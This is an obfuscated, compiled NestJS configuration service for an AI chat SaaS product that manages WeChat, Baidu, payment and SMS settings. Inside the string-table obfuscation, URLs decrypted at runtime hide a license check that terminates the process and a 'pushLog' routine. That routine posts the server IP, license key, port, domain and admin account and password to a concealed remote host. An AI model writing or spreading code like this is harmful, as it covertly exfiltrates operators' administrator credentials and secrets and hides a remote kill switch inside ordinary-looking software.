'use strict';const _0x1485a8=_0x1fc0;(function(_0x2e4486,_0x3cfa41){const _0x1b8e09=_0x1fc0,_0x170354=_0x2e4486();while(!![]){try{const _0x146578=-parseInt(_0x1b8e09(0xcd))/0x1+-parseInt(_0x1b8e09(0x139))/0x2+parseInt(_0x1b8e09(0xd6))/0x3+-parseInt(_0x1b8e09(0x150))/0x4+-parseInt(_0x1b8e09(0xd8))/0x5+parseInt(_0x1b8e09(0xd0))/0x6+parseInt(_0x1b8e09(0x116))/0x7;if(_0x146578===_0x3cfa41)break;else _0x170354['push'](_0x170354['shift']());}catch(_0x5ee99f){_0x170354['push'](_0x170354['shift']());}}}(_0x5a13,0x280eb));var __decorate=this&&this[_0x1485a8(0x159)]||function(_0x25956a,_0x3fdc49,_0x341f86,_0x18693e){const _0x53437c=_0x1485a8;var _0x54c5cb=arguments[_0x53437c(0x14b)],_0x1593b2=_0x54c5cb<0x3?_0x3fdc49:_0x18693e===null?_0x18693e=Object[_0x53437c(0x138)](_0x3fdc49,_0x341f86):_0x18693e,_0xd0a1f9;if(typeof Reflect===_0x53437c(0x144)&&typeof Reflect[_0x53437c(0xe7)]==='function')_0x1593b2=Reflect['decorate'](_0x25956a,_0x3fdc49,_0x341f86,_0x18693e);else{for(var _0x1c9ed8=_0x25956a[_0x53437c(0x14b)]-0x1;_0x1c9ed8>=0x0;_0x1c9ed8--)if(_0xd0a1f9=_0x25956a[_0x1c9ed8])_0x1593b2=(_0x54c5cb<0x3?_0xd0a1f9(_0x1593b2):_0x54c5cb>0x3?_0xd0a1f9(_0x3fdc49,_0x341f86,_0x1593b2):_0xd0a1f9(_0x3fdc49,_0x341f86))||_0x1593b2;}return _0x54c5cb>0x3&&_0x1593b2&&Object[_0x53437c(0x171)](_0x3fdc49,_0x341f86,_0x1593b2),_0x1593b2;},__metadata=this&&this[_0x1485a8(0xe4)]||function(_0x2f6cf1,_0x39644b){const _0x38fbc1=_0x1485a8;if(typeof Reflect===_0x38fbc1(0x144)&&typeof Reflect['metadata']===_0x38fbc1(0x100))return Reflect[_0x38fbc1(0x172)](_0x2f6cf1,_0x39644b);},__param=this&&this['__param']||function(_0x44f610,_0x19e515){return function(_0x577048,_0x704f06){_0x19e515(_0x577048,_0x704f06,_0x44f610);};};function _0x1fc0(_0x1c322a,_0x56e506){const _0x5a1332=_0x5a13();return _0x1fc0=function(_0x1fc00b,_0xfc714f){_0x1fc00b=_0x1fc00b-0xcd;let _0x392166=_0x5a1332[_0x1fc00b];return _0x392166;},_0x1fc0(_0x1c322a,_0x56e506);}Object['defineProperty'](exports,_0x1485a8(0xe2),{'value':!![]}),exports[_0x1485a8(0x13b)]=void 0x0;function _0x5a13(){const _0x1b1269=['vipLeavelRelEntity','baiduTextStatus','&secret=','../../common/store','MusicConfig','saasId','phoneRegisterStatus','keys','wechatAccessToken-','default','签到功能暂未开放!','OfficialService','payWechatStatus','function','error','wechatOfficialAppId','response','InjectRepository','ClsService','find','message','vxNumber','baidu','from','checkDomain','getWechatAccessToken','baiduTextApiKey','https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=','qqNumber','log','configVal','ceshi.qumao518.vip','nineaiBuiltInSensitiveStatus','robotAvatar2Base64','checkAiAuth','4007731HAOTNl','POST','HttpStatus','includes','typeorm','HttpException','decrypt','baiduTextAccessToken-0','Repository','./config.entity','aliPhoneAccessKeySecret','payEpayStatus','BAD_REQUEST','queryFrontConfig','getConfigs4Front','errmsg','bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==','design:paramtypes','&type=jsapi','../../common/utils','WechatConfig','set','wechatAccessTokenMap','UNAUTHORIZED','base64','获取微信access_token失败、错误信息：','9kxwFUQptTaelrKStrwZQQ==','TRUE','nestjs-cls','百度敏感词配置检测失败，您的参数可能配置的不正确!','JPFq8fAlQE2V2Eq7KWYSxg==','payMpayStatus','has','getPhoneVerifyConfig','getOwnPropertyDescriptor','296196xzEbWw','百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!','GlobalConfigService','json','ticket','check','configEntity','exit','toString','cls','查询配置不能为空！','object','error_description','@nestjs/common','data:image/jpeg;base64,','mpay','VipLeavelRelEntity','saveVipLeavelRel','length','kaifa.qumao518.vip','warn','nineai','application/json','847584zICQhB','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q','LinkFoxConfig','configKey','concat','push\x20log\x20error','catch','pushLog','access_token','__decorate','wechatOfficialAppSecret','nineaiBuiltInSensitiveApiBase','getVipLeavelRelById','wechatJsapiTicketMap','fetchBaseAccessToken','CZConfig','SelfKeys','./vip_leavel_rel.entity','domain','APP_VERSION','https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official','forEach','PPTConfig','global','env','refresh','every','baiduTextAccessToken','Logger','手机验证码功能暂未开放!','initBaiduSensitive','save','&client_secret=','defineProperty','metadata','@nestjs/typeorm','GOMAXAI_HOST','saas.qumao518.vip','支付功能暂未开放!','178632VPwSsa','aliPhoneAccessKeyId','payHupiStatus','12324PKUCJY','MjConfig','setConfig','\x20微信配置缺失，不可使用微信登录！','code','post','700911ZuCbCo','createOrUpdate','527615UOgmYU','registerBaseUrl','./constant','PORT','findOne','data','SAAS','axios','@nestjs/cli/actions','signInStatus','__esModule','update','__metadata','epay','baiduTextSecretKey','decorate','nineaiBuiltInSensitiveAuthKey','getSignatureGiftConfig','stringify','get','siteName','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','GOMAXAI','onModuleInit','ISDEV','ConfigEntity','getConfigByKeys'];_0x5a13=function(){return _0x1b1269;};return _0x5a13();}const common_1=require(_0x1485a8(0x146)),config_entity_1=require(_0x1485a8(0x11f)),typeorm_1=require(_0x1485a8(0x173)),typeorm_2=require(_0x1485a8(0x11a)),utils_1=require(_0x1485a8(0x129)),axios_1=require(_0x1485a8(0xdf)),actions_1=require(_0x1485a8(0xe0)),store_1=require('../../common/store'),store_2=require(_0x1485a8(0xf6)),AppConfig_1=require('../../config/AppConfig'),vip_leavel_rel_entity_1=require(_0x1485a8(0x161)),nestjs_cls_1=require(_0x1485a8(0x132)),constant_1=require(_0x1485a8(0xda)),authCheckUrl=(0x0,utils_1['decrypt'])(_0x1485a8(0x151)),authLogUrl=(0x0,utils_1[_0x1485a8(0x11c)])('Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U');let GlobalConfigService=class GlobalConfigService{constructor(_0x3bf05e,_0x51f806,_0x186c78){const _0x37f179=_0x1485a8;this[_0x37f179(0x13f)]=_0x3bf05e,this[_0x37f179(0xf3)]=_0x51f806,this[_0x37f179(0x142)]=_0x186c78,this[_0x37f179(0x12c)]=new Map(),this['wechatJsapiTicketMap']=new Map();}async[_0x1485a8(0xef)](){const _0x96513e=_0x1485a8;await this['checkAiAuth'](),await this[_0x96513e(0x157)](),await this[_0x96513e(0x16e)](),await this[_0x96513e(0x10c)](!![]);const _0x21388d=[][_0x96513e(0x154)](store_1[_0x96513e(0xd1)][_0x96513e(0xfa)],store_1[_0x96513e(0x15f)]['keys'],store_2[_0x96513e(0x12a)][_0x96513e(0xfa)],store_1[_0x96513e(0x152)][_0x96513e(0xfa)],store_1[_0x96513e(0x166)][_0x96513e(0xfa)],store_1[_0x96513e(0xf7)][_0x96513e(0xfa)]),_0x91be2c=await this[_0x96513e(0xf2)](_0x21388d);store_1[_0x96513e(0xd1)][_0x96513e(0x169)](_0x91be2c),store_1['CZConfig']['refresh'](_0x91be2c),store_2['WechatConfig'][_0x96513e(0x169)](_0x91be2c),store_1['LinkFoxConfig'][_0x96513e(0x169)](_0x91be2c),store_1['MusicConfig'][_0x96513e(0x169)](_0x91be2c),store_1[_0x96513e(0x166)][_0x96513e(0x169)](_0x91be2c);}async[_0x1485a8(0x115)](){const _0x4a2aab=_0x1485a8,_0x2d2352=process[_0x4a2aab(0x168)][(0x0,utils_1[_0x4a2aab(0x11c)])(_0x4a2aab(0x134))],_0x20af75=process[_0x4a2aab(0x168)][(0x0,utils_1[_0x4a2aab(0x11c)])(_0x4a2aab(0x130))];(!_0x20af75||!_0x2d2352)&&(common_1[_0x4a2aab(0x16c)][_0x4a2aab(0x101)]((0x0,utils_1['decrypt'])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x4a2aab(0x140)])());const _0x38a69e={'authDomain':_0x2d2352,'authKey':_0x20af75},_0x3a5ec0={'method':_0x4a2aab(0x117),'headers':{'Content-Type':'application/json'},'body':JSON[_0x4a2aab(0xea)](_0x38a69e)},_0x12e5ca=await fetch(authCheckUrl,_0x3a5ec0)['then'](_0x4cf66e=>{const _0x192754=_0x4a2aab;return _0x4cf66e[_0x192754(0x13c)]();})['catch'](_0x54bc53=>{const _0x25c7c3=_0x4a2aab;common_1['Logger']['error'](_0x54bc53,_0x25c7c3(0x167));});_0x12e5ca['code']!==0x0&&(common_1[_0x4a2aab(0x16c)][_0x4a2aab(0x101)]((0x0,utils_1[_0x4a2aab(0x11c)])(_0x4a2aab(0x126))),(0x0,actions_1[_0x4a2aab(0x140)])()),_0x12e5ca?.[_0x4a2aab(0xd4)]===0x0&&!_0x12e5ca?.[_0x4a2aab(0xdd)]?.[_0x4a2aab(0x13e)]&&(common_1[_0x4a2aab(0x16c)][_0x4a2aab(0x101)]((0x0,utils_1[_0x4a2aab(0x11c)])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x4a2aab(0x140)])());}async['pushLog'](_0x5e74f6,_0x33c3ce){const _0x348a3c=_0x1485a8,_0x15dc1e=process['env'][(0x0,utils_1[_0x348a3c(0x11c)])(_0x348a3c(0x134))],_0x11ce9b=process['env'][(0x0,utils_1['decrypt'])(_0x348a3c(0x130))],_0xdb7044=process[_0x348a3c(0x168)][_0x348a3c(0xdb)];if(!_0x15dc1e||!_0x11ce9b)throw new common_1[(_0x348a3c(0x11b))]((0x0,utils_1[_0x348a3c(0x11c)])(_0x348a3c(0xed)),common_1[_0x348a3c(0x118)][_0x348a3c(0x12d)]);const {qqNumber:_0x584403,vxNumber:_0x123ef1,siteName:_0x1d12ba,domain:_0x318b0f,registerBaseUrl:_0x5f19cd}=await this['getConfigByKeys']([_0x348a3c(0x10f),'vxNumber',_0x348a3c(0xec),_0x348a3c(0x162),_0x348a3c(0xd9)]),_0x554e62={'ip':_0x15dc1e,'key':_0x11ce9b,'port':_0xdb7044,'qqNumber':_0x584403,'vxNumber':_0x123ef1,'domain':_0x318b0f,'adminAccount':_0x5e74f6,'adminPass':_0x33c3ce,'baseUrl':_0x5f19cd,'siteName':_0x1d12ba,'qq':_0x584403,'vxNum':_0x123ef1,'version':AppConfig_1[_0x348a3c(0x163)]},_0x47d3ef={'method':_0x348a3c(0x117),'headers':{'Content-Type':_0x348a3c(0x14f)},'body':JSON[_0x348a3c(0xea)](_0x554e62)};await fetch(authLogUrl,_0x47d3ef)[_0x348a3c(0x156)](_0x555f36=>{const _0x152b19=_0x348a3c;console[_0x152b19(0x110)](_0x152b19(0x155),_0x555f36);});}async[_0x1485a8(0x16e)](_0xdc9ef7=!![]){const _0x49d214=_0x1485a8,{baiduTextApiKey:_0x2895e0,baiduTextSecretKey:_0x456bdf}=await this[_0x49d214(0xf2)]([_0x49d214(0x10d),_0x49d214(0xe6)]);if(!_0x2895e0||!_0x456bdf){common_1['Logger']['error'](_0x49d214(0x13a),_0x49d214(0x13b));return;}const _0x4d741={'Content-Type':_0x49d214(0x14f),'Accept':_0x49d214(0x14f)},_0xbb44a1='https://aip.baidubce.com/oauth/2.0/token?client_id='+_0x2895e0+_0x49d214(0x170)+_0x456bdf+'&grant_type=client_credentials';try{const _0x53da8d=await axios_1[_0x49d214(0xfc)][_0x49d214(0xd5)](_0xbb44a1,{'headers':_0x4d741});this['baiduTextAccessToken']=_0x53da8d[_0x49d214(0xdd)]['access_token'];}catch(_0x16596a){if(_0xdc9ef7)common_1[_0x49d214(0x16c)][_0x49d214(0x101)](_0x49d214(0x133),'GlobalConfigService');else throw new common_1['HttpException'](_0x16596a[_0x49d214(0x103)][_0x49d214(0xdd)][_0x49d214(0x145)],common_1[_0x49d214(0x118)]['BAD_REQUEST']);}}async[_0x1485a8(0x10c)](_0x309975=![]){const _0x327b4b=_0x1485a8,_0x60dac0=new Map(),_0x136934=await this[_0x327b4b(0x13f)][_0x327b4b(0x106)]({'where':{'configKey':(0x0,typeorm_2['In'])(['wechatOfficialAppId','wechatOfficialAppSecret'])}});_0x136934[_0x327b4b(0x165)](_0x108b4e=>{const _0x46025e=_0x327b4b;!_0x60dac0[_0x46025e(0x136)](_0x108b4e[_0x46025e(0xf8)])&&_0x60dac0['set'](_0x108b4e[_0x46025e(0xf8)],{}),_0x60dac0[_0x46025e(0xeb)](_0x108b4e[_0x46025e(0xf8)])[_0x108b4e['configKey']]=_0x108b4e[_0x46025e(0x111)];}),_0x60dac0[_0x327b4b(0x165)]((_0x8618b5,_0x12adaa)=>{const _0x4e1b9a=_0x327b4b;!_0x8618b5[_0x4e1b9a(0x102)]||!_0x8618b5[_0x4e1b9a(0x15a)]?common_1[_0x4e1b9a(0x16c)][_0x4e1b9a(0x14d)]('saas\x20'+_0x12adaa+_0x4e1b9a(0xd3),_0x4e1b9a(0x10c)):this[_0x4e1b9a(0x15e)](_0x12adaa,_0x8618b5[_0x4e1b9a(0x102)],_0x8618b5[_0x4e1b9a(0x15a)],_0x309975);}),common_1[_0x327b4b(0x16c)]['log']('wechat\x20get\x20access_token\x20done',_0x327b4b(0xfe));}async[_0x1485a8(0x15e)](_0x49828e,_0x5c8f4d,_0x4a9aaf,_0x2e8ed8=![]){const _0xab653e=_0x1485a8;if(process[_0xab653e(0x168)][_0xab653e(0xf0)]===_0xab653e(0x131))return;try{let _0x59f56d='';const _0x5bc429=process[_0xab653e(0x168)][_0xab653e(0x174)];if(_0x5bc429===_0xab653e(0x14c)||_0x5bc429===_0xab653e(0x112)||_0x5bc429===_0xab653e(0x175)){const _0x31a631=await axios_1[_0xab653e(0xfc)][_0xab653e(0xeb)](_0xab653e(0x164));_0x59f56d=_0x31a631[_0xab653e(0xdd)][_0xab653e(0xdd)];}else{const _0x4e3b38=await axios_1['default'][_0xab653e(0xeb)]('https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid='+_0x5c8f4d+_0xab653e(0xf5)+_0x4a9aaf);if(_0x4e3b38[_0xab653e(0xdd)][_0xab653e(0x125)])throw new Error(_0xab653e(0x12f)+_0x4e3b38[_0xab653e(0xdd)]['errmsg']);_0x59f56d=_0x4e3b38[_0xab653e(0xdd)][_0xab653e(0x158)];}this[_0xab653e(0x12c)][_0xab653e(0x12b)](_0x49828e,_0x59f56d);const _0x55fca0=await axios_1['default'][_0xab653e(0xeb)](_0xab653e(0x10e)+_0x59f56d+_0xab653e(0x128));this[_0xab653e(0x15d)]['set'](_0x49828e,_0x55fca0?.[_0xab653e(0xdd)]?.[_0xab653e(0x13d)]);}catch(_0x17273f){common_1[_0xab653e(0x16c)]['error'](_0x17273f[_0xab653e(0x107)],_0xab653e(0x15e));}}async[_0x1485a8(0x10b)](_0x3a12b8){const _0x1f5951=_0x1485a8;if(process[_0x1f5951(0x168)][_0x1f5951(0xde)])return!![];const {domain:_0x366111}=_0x3a12b8,_0x21e5ff=process['env'][(0x0,utils_1[_0x1f5951(0x11c)])(_0x1f5951(0x134))];return _0x366111[_0x1f5951(0x119)](_0x21e5ff);}async['createOrUpdate'](_0xd44b71){const _0x1cca34=_0x1485a8;try{const _0x4a39ee=this[_0x1cca34(0x142)]['get'](_0x1cca34(0xf8)),{configKey:_0x1b1b49,configVal:_0x592f07,status:status=0x1}=_0xd44b71,_0x171055=await this['configEntity'][_0x1cca34(0xdc)]({'where':{'configKey':_0x1b1b49,'saasId':_0x4a39ee}});typeof _0x592f07===_0x1cca34(0x144)?_0x171055?await this[_0x1cca34(0x13f)][_0x1cca34(0xe3)]({'configKey':_0x1b1b49,'saasId':_0x4a39ee},{'configJsonVal':_0x592f07,'status':status}):await this[_0x1cca34(0x13f)][_0x1cca34(0x16f)]({'configKey':_0x1b1b49,'configJsonVal':_0x592f07,'status':status,'saasId':_0x4a39ee}):_0x171055?await this[_0x1cca34(0x13f)]['update']({'configKey':_0x1b1b49,'saasId':_0x4a39ee},{'configVal':_0x592f07,'status':status}):await this[_0x1cca34(0x13f)][_0x1cca34(0x16f)]({'configKey':_0x1b1b49,'configVal':_0x592f07,'status':status,'saasId':_0x4a39ee});}catch(_0x5efa9c){throw new common_1['HttpException']('设置配置信息错误！',common_1['HttpStatus'][_0x1cca34(0x122)]);}}async[_0x1485a8(0xd2)](_0x186bc0){const _0x45615f=_0x1485a8;let _0x5d2e02=![],_0xa1b780=![],_0x442359=![],_0x32ea1b=![],_0x2e01ca=![],_0x1a42d0=![],_0x325e6c=![];const _0x32585c={},{settings:_0xa087ab}=_0x186bc0;for(const _0x2e927b of _0xa087ab){await this[_0x45615f(0xd7)](_0x2e927b),_0x32585c[_0x2e927b[_0x45615f(0x153)]]=_0x2e927b['configVal'],store_1['MjConfig'][_0x2e927b[_0x45615f(0x153)]]&&(_0x5d2e02=!![]),store_1[_0x45615f(0x15f)][_0x2e927b[_0x45615f(0x153)]]&&(_0xa1b780=!![]),store_2[_0x45615f(0x12a)][_0x2e927b['configKey']]&&(_0x442359=!![]),store_1[_0x45615f(0x152)][_0x2e927b[_0x45615f(0x153)]]&&(_0x325e6c=!![]),[_0x45615f(0x10d),_0x45615f(0xe6)][_0x45615f(0x119)](_0x2e927b['configKey'])&&(_0x32ea1b=!![]),[_0x45615f(0x102),'wechatOfficialAppSecret'][_0x45615f(0x119)](_0x2e927b[_0x45615f(0x153)])&&(_0x2e01ca=!![]),[_0x45615f(0x10f),_0x45615f(0x108),'siteName',_0x45615f(0x162),_0x45615f(0xd9)][_0x45615f(0x119)](_0x2e927b[_0x45615f(0x153)])&&(_0x1a42d0=!![]);}return _0x5d2e02&&store_1['MjConfig'][_0x45615f(0x169)](_0x32585c),_0xa1b780&&store_1[_0x45615f(0x15f)][_0x45615f(0x169)](_0x32585c),_0x442359&&store_2[_0x45615f(0x12a)][_0x45615f(0x169)](_0x32585c),_0x325e6c&&store_1['LinkFoxConfig'][_0x45615f(0x169)](_0x32585c),_0x32ea1b&&await this[_0x45615f(0x16e)](![]),_0x2e01ca&&await this['getWechatAccessToken'](),_0x1a42d0&&this['pushLog'](),'设置完成！';}async[_0x1485a8(0x124)](_0x36b228){const _0x75b760=_0x1485a8,_0x31fcfa=await this[_0x75b760(0xf2)](_0x36b228,!![]);return _0x36b228[_0x75b760(0x14b)]===0x1?_0x31fcfa[_0x36b228[0x0]]:_0x31fcfa;}async['getConfigByKeys'](_0x177025,_0x102970=![]){const _0x118622=_0x1485a8;if(!_0x177025[_0x118622(0x14b)])throw new Error(_0x118622(0x143));const _0x20db1a=this[_0x118622(0x142)]['get'](_0x118622(0xf8))||0x0,_0x3eb92b=new Map(),_0x363b00=await this[_0x118622(0x13f)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])(_0x177025),'saasId':(0x0,typeorm_2['In'])([0x0,_0x20db1a])}});_0x363b00[_0x118622(0x165)](_0x13c401=>{const _0x5940fc=_0x118622,{configKey:_0x1ae13d,configVal:_0x56fbbc,configJsonVal:_0x844416,saasId:_0x53d4bd}=_0x13c401;_0x3eb92b[_0x5940fc(0x12b)](_0x1ae13d+'-'+_0x53d4bd,_0x844416||_0x56fbbc);}),this[_0x118622(0x12c)][_0x118622(0x165)]((_0x59c1ea,_0x17c366)=>{const _0xf98618=_0x118622;_0x3eb92b[_0xf98618(0x12b)](_0xf98618(0xfb)+_0x17c366,_0x59c1ea);}),this[_0x118622(0x15d)][_0x118622(0x165)]((_0x30e615,_0x23d282)=>{const _0x52fd18=_0x118622;_0x3eb92b[_0x52fd18(0x12b)]('wechatJsapiTicket-'+_0x23d282,_0x30e615);}),_0x3eb92b[_0x118622(0x12b)](_0x118622(0x11d),this[_0x118622(0x16b)]);const _0x1b6a8e={};_0x177025['forEach'](_0x180d51=>{const _0x3ef492=_0x118622;let _0x176b9d=_0x180d51+'-'+_0x20db1a,_0x4f4b1c='';_0x3eb92b['has'](_0x176b9d)?_0x4f4b1c=_0x3eb92b[_0x3ef492(0xeb)](_0x176b9d):!constant_1[_0x3ef492(0x160)]['includes'](_0x180d51)&&(_0x4f4b1c=_0x3eb92b[_0x3ef492(0xeb)](_0x180d51+'-'+0x0)),_0x1b6a8e[_0x180d51]=_0x4f4b1c;});if(_0x102970)return _0x1b6a8e;return _0x177025[_0x118622(0x14b)]===0x1?_0x1b6a8e[_0x177025[0x0]]:_0x1b6a8e;}async[_0x1485a8(0x123)](){const _0x50c7a2=_0x1485a8,_0x20cc4a=await this[_0x50c7a2(0xf2)](constant_1['FrontKeys']);return{..._0x20cc4a,'isUseWxLogin':!!(_0x20cc4a[_0x50c7a2(0x102)]&&_0x20cc4a[_0x50c7a2(0x15a)])};}async['queryPayType'](_0x23f9b5='wechat'){const _0x4bf346=_0x1485a8,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x4bf346(0xf2)]([_0x4bf346(0xcf),_0x4bf346(0x121),_0x4bf346(0x135),_0x4bf346(0xff)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus][_0x4bf346(0x16a)](_0x1fd3f5=>_0x1fd3f5===0x0))throw new common_1[(_0x4bf346(0x11b))](_0x4bf346(0x176),common_1[_0x4bf346(0x118)][_0x4bf346(0x122)]);if(Number(payWechatStatus)===0x1)return _0x23f9b5;if(Number(payEpayStatus)===0x1)return _0x4bf346(0xe5);if(Number(payMpayStatus)===0x1)return _0x4bf346(0x148);if(Number(payHupiStatus)===0x1)return'hupi';}async[_0x1485a8(0x137)](){const _0x2c8222=_0x1485a8,{phoneRegisterStatus:_0x27f03b,aliPhoneAccessKeyId:_0x2aeff3,aliPhoneAccessKeySecret:_0x5dcb67,aliPhoneSignName:_0x5d395d,aliPhoneTemplateCode:_0x418bd3}=await this[_0x2c8222(0xf2)]([_0x2c8222(0xf9),_0x2c8222(0xce),_0x2c8222(0x120),'aliPhoneSignName','aliPhoneTemplateCode']);if(Number(_0x27f03b)!==0x1)throw new common_1[(_0x2c8222(0x11b))](_0x2c8222(0x16d),common_1[_0x2c8222(0x118)][_0x2c8222(0x122)]);return{'accessKeyId':_0x2aeff3,'accessKeySecret':_0x5dcb67,'SignName':_0x5d395d,'TemplateCode':_0x418bd3};}['getNamespace'](){const _0x58807c=_0x1485a8;return process[_0x58807c(0x168)]['NAMESPACE']||_0x58807c(0xee);}async[_0x1485a8(0xe9)](){const _0x4788c8=_0x1485a8,_0x59fd10=await this['getConfigByKeys'](['signInStatus','signInRewards']),_0xb0e3f8={};for(let _0x1da47b in _0x59fd10){const _0x30ea9c=Number(_0x59fd10[_0x1da47b]);_0xb0e3f8[_0x1da47b]=isNaN(_0x30ea9c)?0x0:_0x30ea9c;}if(!_0xb0e3f8[_0x4788c8(0xe1)])throw new common_1[(_0x4788c8(0x11b))](_0x4788c8(0xfd),common_1[_0x4788c8(0x118)]['BAD_REQUEST']);return _0xb0e3f8['signInRewards'];}async['getSensitiveConfig'](){const _0x169667=_0x1485a8,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x34b6e8,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x5f0f4c,nineaiBuiltInSensitiveAuthKey:_0x4cf56f}=await this['getConfigByKeys']([_0x169667(0xf4),'baiduTextAccessToken',_0x169667(0x113),_0x169667(0x15b),_0x169667(0xe8)]);if(Number(baiduTextStatus)===0x1)return{'useType':_0x169667(0x109),'baiduTextAccessToken':_0x34b6e8};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x169667(0x14e),'nineaiBuiltInSensitiveApiBase':_0x5f0f4c,'nineaiBuiltInSensitiveAuthKey':_0x4cf56f};return null;}async[_0x1485a8(0x114)](){const _0x24d81d=_0x1485a8,_0x2db9eb=await this[_0x24d81d(0xf2)](['robotAvatar']);if(!_0x2db9eb)throw new common_1[(_0x24d81d(0x11b))]('未配置\x20robotAvatar.',common_1[_0x24d81d(0x118)]['BAD_GATEWAY']);const _0x462488=await axios_1['default']['get'](_0x2db9eb,{'responseType':'arraybuffer'}),_0x3be730=Buffer[_0x24d81d(0x10a)](_0x462488[_0x24d81d(0xdd)])[_0x24d81d(0x141)](_0x24d81d(0x12e));return _0x24d81d(0x147)+_0x3be730;}async[_0x1485a8(0x14a)](_0x125544){const _0x44063b=_0x1485a8;await this[_0x44063b(0xf3)]['save'](_0x125544);}async[_0x1485a8(0x15c)](_0x17a04c,_0x3c76e3,_0x2bf486){const _0x3c0b81=_0x1485a8,_0x5e2c8c={'vipLeavelId':_0x17a04c,'relateType':_0x3c76e3};_0x2bf486&&(_0x5e2c8c['relateId']=_0x2bf486);const _0x244bdb=await this[_0x3c0b81(0xf3)][_0x3c0b81(0xdc)]({'where':_0x5e2c8c});return _0x244bdb;}};GlobalConfigService=__decorate([(0x0,common_1['Injectable'])(),__param(0x0,(0x0,typeorm_1[_0x1485a8(0x104)])(config_entity_1[_0x1485a8(0xf1)])),__param(0x1,(0x0,typeorm_1[_0x1485a8(0x104)])(vip_leavel_rel_entity_1[_0x1485a8(0x149)])),__metadata(_0x1485a8(0x127),[typeorm_2[_0x1485a8(0x11e)],typeorm_2[_0x1485a8(0x11e)],nestjs_cls_1[_0x1485a8(0x105)]])],GlobalConfigService),exports['GlobalConfigService']=GlobalConfigService;